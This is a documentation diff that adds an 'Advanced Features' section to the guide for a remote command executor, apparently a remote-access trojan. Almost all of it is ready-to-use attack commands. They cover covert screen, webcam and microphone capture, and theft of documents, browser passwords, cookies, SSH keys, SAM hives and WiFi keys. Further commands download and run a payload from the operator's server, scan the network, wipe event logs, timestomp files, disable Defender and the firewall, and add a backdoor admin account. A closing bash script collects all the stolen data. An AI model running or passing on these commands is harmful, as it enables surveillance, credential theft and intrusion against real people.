@@ -411,6 +411,290 @@ sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/activit
 sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "del C:\\temp\\keys.log C:\\temp\\keylog.txt C:\\temp\\activity.log"
 ```
 
+### Advanced Features
+
+Beyond basic monitoring and keylogging, the remote command executor supports powerful advanced capabilities:
+
+#### 1. Screenshot Capture
+
+**Single Screenshot**:
+```json
+{
+  "command": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('C:\\temp\\screenshot.png'); $graphics.Dispose(); $bitmap.Dispose()\"",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Continuous Screenshots** (every 30 seconds):
+```json
+{
+  "command": "powershell -WindowStyle Hidden -Command \"Add-Type -AssemblyName System.Windows.Forms,System.Drawing; while($true){$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b=New-Object System.Drawing.Bitmap $s.Width,$s.Height; $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size); $b.Save(\\\"C:\\temp\\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png\\\"); $g.Dispose(); $b.Dispose(); Start-Sleep 30}\" &",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Retrieve Screenshots**:
+```bash
+sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/screenshot*.png ./screenshots/
+```
+
+#### 2. Webcam Capture
+
+**Take Webcam Photo**:
+```json
+{
+  "command": "powershell -Command \"$webcam = New-Object -ComObject WIA.DeviceManager; $device = $webcam.DeviceInfos.Item(1).Connect(); $item = $device.Items.Item(1); $image = $item.Transfer(); $image.SaveFile('C:\\temp\\webcam.jpg')\"",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Alternative using CommandCam** (if available):
+```json
+{
+  "command": "cmd /c CommandCam.exe /filename C:\\temp\\webcam.jpg",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+#### 3. Audio Recording
+
+**Record Microphone** (30 seconds):
+```json
+{
+  "command": "powershell -Command \"Add-Type -TypeDefinition @'using System; using System.Runtime.InteropServices; public class Audio{[DllImport(\\\"winmm.dll\\\")] public static extern int mciSendString(string command, System.Text.StringBuilder returnValue, int returnLength, IntPtr winHandle);}'; $sb = New-Object System.Text.StringBuilder 256; [Audio]::mciSendString('open new Type waveaudio Alias recsound', $sb, 256, [IntPtr]::Zero); [Audio]::mciSendString('record recsound', $sb, 256, [IntPtr]::Zero); Start-Sleep 30; [Audio]::mciSendString('save recsound C:\\\\temp\\\\audio.wav', $sb, 256, [IntPtr]::Zero); [Audio]::mciSendString('close recsound', $sb, 256, [IntPtr]::Zero)\"",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+#### 4. File Exfiltration
+
+**Search and Exfiltrate Documents**:
+```json
+{
+  "command": "powershell -Command \"Get-ChildItem -Path C:\\Users -Include *.docx,*.xlsx,*.pdf,*.txt -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Length -lt 10MB} | Copy-Item -Destination C:\\temp\\docs\\ -Force\"",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 120
+}
+```
+
+**Exfiltrate Browser Passwords** (Chrome):
+```json
+{
+  "command": "powershell -Command \"Copy-Item \\\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\\\" C:\\temp\\chrome_passwords.db -Force\"",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Exfiltrate SSH Keys**:
+```json
+{
+  "command": "cmd /c xcopy /E /I /Y %USERPROFILE%\\.ssh C:\\temp\\ssh_keys\\",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Retrieve Exfiltrated Files**:
+```bash
+sshpass -p "YOUR_WINDOWS_PASSWORD" scp -r administrator@TARGET_HOST:C:/temp/docs ./exfiltrated/
+sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/chrome_passwords.db ./
+```
+
+#### 5. Credential Harvesting
+
+**Dump Windows Credentials** (requires admin):
+```json
+{
+  "command": "cmd /c reg save HKLM\\SAM C:\\temp\\sam.hive && reg save HKLM\\SYSTEM C:\\temp\\system.hive",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Extract WiFi Passwords**:
+```json
+{
+  "command": "cmd /c netsh wlan show profiles > C:\\temp\\wifi_profiles.txt && for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @netsh wlan show profile name=%j key=clear >> C:\\temp\\wifi_passwords.txt",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Harvest Browser Cookies**:
+```json
+{
+  "command": "powershell -Command \"Copy-Item \\\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies\\\" C:\\temp\\chrome_cookies.db -Force\"",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+#### 6. Persistence Verification
+
+**Check Startup Items**:
+```json
+{
+  "command": "cmd /c reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run > C:\\temp\\startup_items.txt && type C:\\temp\\startup_items.txt",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Verify Binary is Running**:
+```json
+{
+  "command": "cmd /c tasklist | findstr remote_cmd.exe > C:\\temp\\process_check.txt && type C:\\temp\\process_check.txt",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+#### 7. Remote Shell Access
+
+**Execute PowerShell Commands**:
+```json
+{
+  "command": "powershell -Command \"Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 | Format-Table -AutoSize > C:\\temp\\top_processes.txt; Get-Content C:\\temp\\top_processes.txt\"",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Download and Execute**:
+```json
+{
+  "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://YOUR_SERVER_IP/payload.exe' -OutFile C:\\temp\\payload.exe; Start-Process C:\\temp\\payload.exe\"",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+#### 8. Lateral Movement
+
+**Enumerate Network Shares**:
+```json
+{
+  "command": "cmd /c net view /all > C:\\temp\\network_shares.txt && type C:\\temp\\network_shares.txt",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Scan Local Network**:
+```json
+{
+  "command": "powershell -Command \"1..254 | ForEach-Object {Test-Connection -ComputerName 192.168.1.$_ -Count 1 -Quiet} | Where-Object {$_} > C:\\temp\\live_hosts.txt\"",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 120
+}
+```
+
+#### 9. Anti-Forensics
+
+**Clear Event Logs**:
+```json
+{
+  "command": "cmd /c wevtutil cl System && wevtutil cl Security && wevtutil cl Application && echo Logs cleared",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Delete Traces**:
+```json
+{
+  "command": "cmd /c del /F /Q C:\\temp\\*.txt C:\\temp\\*.log C:\\temp\\*.png C:\\temp\\*.jpg && echo Traces deleted",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Timestomp Files** (modify timestamps):
+```json
+{
+  "command": "powershell -Command \"Get-ChildItem C:\\temp\\remote_cmd.exe | ForEach-Object {$_.CreationTime = '01/01/2020 00:00:00'; $_.LastWriteTime = '01/01/2020 00:00:00'; $_.LastAccessTime = '01/01/2020 00:00:00'}\"",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+#### 10. System Manipulation
+
+**Disable Windows Defender** (requires admin):
+```json
+{
+  "command": "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Disable Firewall** (requires admin):
+```json
+{
+  "command": "cmd /c netsh advfirewall set allprofiles state off",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+**Create Admin User** (requires admin):
+```json
+{
+  "command": "cmd /c net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add",
+  "next": "YOUR_SERVER_IP",
+  "sleep": 60
+}
+```
+
+### Automated Exfiltration Script
+
+Create `exfiltrate_all.sh` for comprehensive data collection:
+
+```bash
+#!/bin/bash
+# Comprehensive data exfiltration script
+
+TARGET_HOST="YOUR_TARGET_IP"
+TARGET_USER="administrator"
+TARGET_PASS="YOUR_WINDOWS_PASSWORD"
+EXFIL_DIR="./exfiltrated/$(date +%Y%m%d_%H%M%S)"
+
+mkdir -p "$EXFIL_DIR"/{screenshots,webcam,audio,docs,credentials,logs}
+
+echo "Starting comprehensive exfiltration from $TARGET_HOST..."
+
+# Screenshots
+sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/screenshot*.png "$EXFIL_DIR/screenshots/" 2>/dev/null
+
+# Webcam
+sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/webcam*.jpg "$EXFIL_DIR/webcam/" 2>/dev/null
+
+# Audio
+sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/audio*.wav "$EXFIL_DIR/audio/" 2>/dev/null
+
+# Documents
+sshpass -p "$TARGET_PASS" scp -r administrator@$TARGET_HOST:C:/temp/docs/* "$EXFIL_DIR/docs/" 2>/dev/null
+
+# Credentials
+sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/chrome_passwords.db "$EXFIL_DIR/credentials/" 2>/dev/null
+sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/wifi_passwords.txt "$EXFIL_DIR/credentials/" 2>/dev/null
+sshpass -p "$TARGET_PASS" scp -r administrator@$TARGET_HOST:C:/temp/ssh_keys/* "$EXFIL_DIR/credentials/" 2>/dev/null
+
+# Logs
+sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/*.log "$EXFIL_DIR/logs/" 2>/dev/null
+sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/keys.log "$EXFIL_DIR/logs/keylogger.log" 2>/dev/null
+
+echo "Exfiltration complete: $EXFIL_DIR"
+ls -lhR "$EXFIL_DIR"
+```
+
 ### Comprehensive Monitoring Script
 
 Create a monitoring command that gathers all information at once:
